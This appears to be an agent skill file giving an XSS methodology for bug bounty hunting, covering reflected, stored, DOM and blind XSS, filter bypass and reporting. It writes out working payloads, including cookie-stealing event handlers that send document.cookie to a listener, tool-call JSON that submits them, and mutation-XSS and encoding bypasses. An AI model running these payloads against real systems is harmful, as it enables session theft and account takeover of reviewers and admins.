---
name: xss
description: Full-spectrum methodology for reflected, stored, DOM-based, and blind XSS, including automated-reviewer/headless-browser detection, filter and sanitizer bypass technique, and impact escalation for bug bounty reporting. Beginner through professional.
---

# CROSS-SITE SCRIPTING (XSS) METHODOLOGY

XSS is consistently the single most reported vulnerability class on bug bounty platforms (HackerOne's own Hacker-Powered Security Report puts the three XSS types at roughly 20% of all valid findings combined). It's common precisely because it hides in ordinary-looking features: contact forms, comment fields, profile bios, support tickets, survey submissions, file names, anywhere text you type might later be displayed, by anyone, anywhere in the system.

## 1. Know Which Kind You're Actually Looking For

Don't test blind. Identify the category first, since the hunting method differs for each:

- **Reflected XSS** — input in a request (URL parameter, search box) is echoed back in that SAME response, unsanitized. Victim has to click a crafted link.
- **Stored XSS** — input is saved server-side and rendered later, to potentially ANY user who views that stored content (a comment, a profile field, a support ticket). Higher impact by default, since no victim interaction with a malicious link is required, they just have to use the app normally.
- **DOM-based XSS** — the vulnerability lives entirely in client-side JavaScript; a "source" (URL fragment, `document.referrer`, `postMessage` data) flows into a "sink" (`innerHTML`, `document.write`, `eval`) without ever touching the server. Requires reading JS, not just testing server responses.
- **Blind XSS** — a stored-XSS variant where YOU never see the payload render. It fires somewhere you have no visibility into, an admin dashboard, an internal support tool, a moderation queue, a log viewer, an automated "review" pipeline. Confirmed only via an out-of-band callback.

## 2. Reflected & Stored — The Standard Hunt

1. **Find every point where your input might come back**, not just obvious search boxes: form fields, HTTP headers your app might log and display (`User-Agent`, `Referer`), file upload names, URL parameters, even error messages that echo back invalid input.
2. **Confirm reflection first with an inert marker**, not a real payload — submit a unique string (`zzXSStestzz123`) and check every place it could plausibly resurface (immediate response, a profile page, an admin-facing list, an email notification) before trying to break anything.
3. **Escalate to a benign tag test — lead with `<img>`/`<svg>`, not `<script>`:**
```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<script>alert(document.domain)</script>
```
`<script>` is the single most commonly stripped tag by naive filters, template auto-escaping, and CSP, so it's the least reliable choice to lead with, not the default. If one tag renders and another doesn't, that's already a useful signal about what the target's filter targets — don't stop at the first success or the first failure, test more than one.
4. If blocked or silent (no visible effect, no callback), don't just retry the same tag — try the others above first, THEN move to Section 4 (filter bypass) if all of them fail. A blocked `<script>` tag blocks exactly one syntax, not the whole vulnerability class, and "no callback" from a `<script>`-only attempt is not evidence the field is safe.

## 3. Stored XSS Into an Automated/Human Review Pipeline (High-Value Pattern)

This is the single most consistently profitable XSS pattern in real disclosed reports — TopCoder's contact form, Rockstar Games' comment moderation panel, and 18F/data.gov's paginated content all follow this exact shape: **user input reaches a review interface with more privilege or trust than the submitter has**.

1. **Identify anything claiming to be "reviewed," "checked," or "processed"** by a person or automated system — support tickets, feedback forms, surveys, content moderation queues, "contact the team" forms, medical/pharmacy note systems, AI concierge/chatbot logging. Any of these implies a second party (human or automated) will eventually READ or RENDER your submission somewhere you can't directly see.
2. **Test for a headless-browser tell before assuming the vector is dead.** Submit a benign out-of-band callback payload and inspect the resulting request headers on your listener:
```html
<img src=x onerror="fetch('http://<listener_ip>:<port>/xss-probe')">
```
```json
{"tool": "curl", "args": {"url": "<submission_endpoint>", "method": "POST", "json": {"<field>": "<img src=x onerror=\"fetch('http://<listener>/xss-probe')\">"}}}
```
   A hit confirms SOMETHING is rendering your HTML. Check the resulting request's `User-Agent` and `Origin` headers on your listener — a `User-Agent` containing `HeadlessChrome`, `Puppeteer`, `PhantomJS`, or an `Origin`/`Referer` pointing at `localhost` or an internal-only hostname confirms this is an automated headless-browser reviewer, not a real human, regardless of what the app's marketing copy claims ("real humans review every submission" is not evidence against this — verify, don't trust the UI text).
3. **Check whether escalation requires specific trigger conditions.** Some review pipelines only route content to a HIGHER-privilege reviewer (a senior staff member vs a junior one) under specific conditions — a keyword match, an "urgent" flag, a category tag. If a lower-tier submission gets reviewed by a lower-privilege account, but you need the HIGHER-privilege account's session for real impact, actively probe the application (ask a chatbot what triggers escalation, read client JS for routing logic, test various flags/keywords) rather than assuming the first reviewer account you catch is the valuable one.
4. **Chain to session/cookie theft once the reviewer is confirmed real — but don't assume the SAME tag that worked for the probe will also work for the real payload, and don't default to `<script>`.** Lead with `<img>`/`<svg>` event-handler vectors, not `<script>`:
```html
<img src=x onerror="fetch('http://<listener>/?k='+document.cookie)">
<svg onload="fetch('http://<listener>/?k='+document.cookie)">
```
`<script>` is the single most commonly stripped or neutralized tag by naive filters, template auto-escaping, and CSP — far more often than event-handler attributes on other tags. Treat `<script>...</script>` as just one of several vectors to try, not the default first choice, especially once you already know something on the page renders your HTML at all (per step 2).
5. **If a payload produces zero callback after a reasonable wait, don't just retry the identical payload with a longer timeout — rotate the payload itself first.** A genuinely delayed review pipeline and a silently-stripped tag look IDENTICAL from the listener's point of view (no hit either way), so waiting longer only tests one of those two explanations. Before concluding it's a timing issue: resubmit with a different tag/vector (`<img onerror>` -> `<svg onload>` -> `<body onload>` -> `<details ontoggle>`, see Section 4) using a fresh token, and only fall back to "just wait longer on the same payload" once you've confirmed at least one tag variant actually renders (e.g. via the step-2 probe) and still get nothing from the cookie-theft version specifically.
6. **If the first attempt produces no callback, don't immediately assume the vector is dead.** Automated review pipelines sometimes run on a delay or batch interval rather than firing instantly on submission — retry after a wait rather than concluding the field is sanitized, especially if earlier steps already confirmed HTML rendering is happening at all (and especially after step 5's payload rotation, not before it).
7. **Before spending more time waiting on a callback, decode every cookie/token you're already holding — this is nearly free and is frequently the actual answer.** Any cookie value that is dot-separated and base64url-looking (this includes plain framework session cookies like Flask's, not just OAuth/API JWTs — you can't tell which one it is by name alone, `session=eyJ...` decodes exactly the same way a real JWT does) can be decoded immediately with the `jwt_forge` tool, no callback or waiting required. In CTF-style and lab targets especially, the flag or sensitive data is often placed directly inside the current session's own payload (a flash message, a hidden field, a debug value) rather than requiring you to steal a *different* privileged user's cookie — so decode what you already have before assuming you need someone else's session.

## 4. Filter & Sanitizer Bypass

Real-world filters are rarely all-or-nothing. Work through these systematically before giving up on a blocked field:

1. **Tag/attribute variation** — if `<script>` is blocked specifically, try alternate execution vectors: `<img onerror=...>`, `<svg onload=...>`, `<body onload=...>`, `<iframe src="javascript:...">`, `<details open ontoggle=...>`.
2. **Case and encoding variation** — `<ScRiPt>`, HTML entity encoding (`&lt;script&gt;`), URL encoding, double encoding, Unicode escapes — naive filters often regex-match only the exact lowercase literal string.
3. **Character-combination trial-and-error** — a real disclosed case (data.gov, 2017) found a filter that ONLY broke when specific `&` characters were placed in particular positions; the sanitizer's own character-stripping function combined unexpectedly with the browser's parsing to re-enable execution. When a payload is fully blocked, don't just try different tags — try adding/removing/repositioning ampersands, quotes, and null bytes around a payload that otherwise fails.
4. **Mutation XSS (mXSS)** — some sanitizers (DOMPurify and similar) parse and re-serialize HTML in a way that can be exploited: a payload that looks inert BEFORE the sanitizer processes it can mutate into an executable form AFTER serialization, because the browser's own HTML parser handles certain malformed nesting (e.g. `<form><math><mtext></form><form><mglyph><svg>...`) differently than the sanitizer expected. If a target uses a known sanitizer library, check its CVE history and public mutation-XSS research for that specific version before assuming it's unbreakable.
5. **CSP as a separate wall, not the same wall** — a payload can achieve DOM XSS execution and still be blocked from doing anything useful by Content-Security-Policy. Check the CSP header independently; a real disclosed HackerOne report (hackerone.com/careers itself) found working DOM XSS that couldn't bypass CSP and was scoped as lower-impact specifically because of that, don't claim full impact until you've checked whether CSP neutralizes the actual payload you'd use for exploitation.
6. **Self-XSS is not a finding.** If the "reflection" only happens when you paste something into your OWN browser console or a debug field only visible to you, with no way to deliver it to another user, it does not qualify as a real vulnerability. Confirm the payload triggers via a NORMAL delivery path (a link, a stored value another user's session would load) before reporting.

## 5. DOM-Based XSS — Source-to-Sink Tracing

1. Read the client-side JS for **sources** — anywhere data enters from outside the developer's direct control: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage` listeners, `localStorage`/`sessionStorage` reads.
2. Trace where that source value flows to a **sink** — `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `Function()`, `.src` assignments on script tags, or a templating engine's unescaped-output directive.
3. If a source reaches a sink without any sanitization step in between, craft a payload matching the source's expected format (typically a URL fragment or parameter) and test in a real browser, DOM XSS often won't show up in server response inspection at all since the vulnerable code never touches the server.

## 6. Blind XSS — Systematic Coverage

Because you get no visual confirmation, blind XSS hunting is a coverage problem, not a cleverness problem:

1. Use a persistent out-of-band callback payload (an XSS-Hunter-style service, or your own listener logging full request details including cookies, URL, and DOM snapshot if the payload supports it) as your DEFAULT payload for every text input across an entire target, not just ones that look promising.
2. Submit it to EVERY plausible input that might reach a backend admin/support/moderation view: contact forms, "report a bug" forms, display names, feedback widgets, order notes, shipping instructions, HTTP headers (`User-Agent` for fields that get logged into an admin panel).
3. Wait. Blind XSS payloads can fire hours or days later when a support agent or admin actually opens the relevant queue. Don't conclude a target is clean just because nothing fired in the first hour.
4. When a callback fires, the captured cookie/session is usually for an INTERNAL, higher-privilege account — treat this as a stepping stone toward full account takeover (see auth-bypass skill for token/session chaining), not the end of the finding by itself.

## 7. Verification & Evidence

1. A payload "being accepted" (200 OK on submission) is not proof of execution — always confirm via an actual out-of-band callback, a visible `alert()`, or a captured cookie.
2. Distinguish self-XSS from real-world exploitable XSS explicitly in your notes before reporting — this is one of the most common reasons XSS reports get downgraded or rejected.
3. Capture the full delivery chain: the exact payload, the exact field/endpoint it was submitted to, the resulting request/response showing execution, and (for stored/blind) the User-Agent/Origin evidence proving what actually rendered it.
4. Record:
```json
{"tool": "record_finding", "args": {"title": "<Stored/Reflected/Blind/DOM> XSS via <field/endpoint> Leading to <Session Hijack/Account Takeover/Info Disclosure>", "kind": "xss", "severity": "high", "request_ref": "<submission_endpoint>", "note": "Confirmed via out-of-band callback. Reviewer identified as <headless browser / human admin> via <User-Agent/Origin evidence>. Escalated to: <cookie theft / session takeover / no further escalation achieved>."}}
```

## 8. Impact Framing (What Actually Gets a Bounty)

Context determines severity far more than the payload itself:
- XSS on a page with no session/state-changing functionality (a static marketing page) is low impact even if technically real.
- XSS reaching a page that handles session tokens, payment info, or admin actions is high-to-critical, even with a "basic" `alert()`-tier payload, because the DELIVERY TARGET is what matters.
- Always articulate the realistic attack scenario in a report: who would click this, what could an attacker actually achieve (cookie theft → session hijack → what specific actions does that session enable), not just "JavaScript executed."
- A blind XSS reaching an internal admin/support panel is routinely rated higher than a reflected XSS on a logged-out marketing page, even though the reflected one might have been technically harder to find — impact beats cleverness when it comes to actual payout and severity classification.

## Rule of Exhaustion
A blocked `<script>` tag is the start of the investigation (Section 4), not the end of it. Test every field that might reach a review pipeline (Section 3) even if the app claims "human review." Retry blind/delayed payloads before concluding a vector is closed. And never claim full impact from payload acceptance alone, always confirm execution and trace the resulting session to its actual privilege level before writing the report.